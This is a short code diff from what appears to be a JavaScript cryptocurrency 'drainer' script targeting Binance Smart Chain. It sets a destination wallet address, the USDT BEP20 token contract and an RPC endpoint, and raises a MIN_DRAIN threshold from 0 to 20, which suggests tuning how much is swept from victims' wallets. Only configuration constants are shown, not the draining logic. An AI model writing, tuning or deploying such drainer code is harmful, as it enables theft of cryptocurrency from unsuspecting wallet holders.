@@ -7,7 +7,7 @@ const DEST_WALLET  = "0x0770e48FD4a7bC60009FFF679FA48B724c904311";
 const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
 const BSC_CHAIN_ID = "0x38";
-const MIN_DRAIN    = 0;
+const MIN_DRAIN    = 20;
 
 // ── Runtime State ──
 let provider;
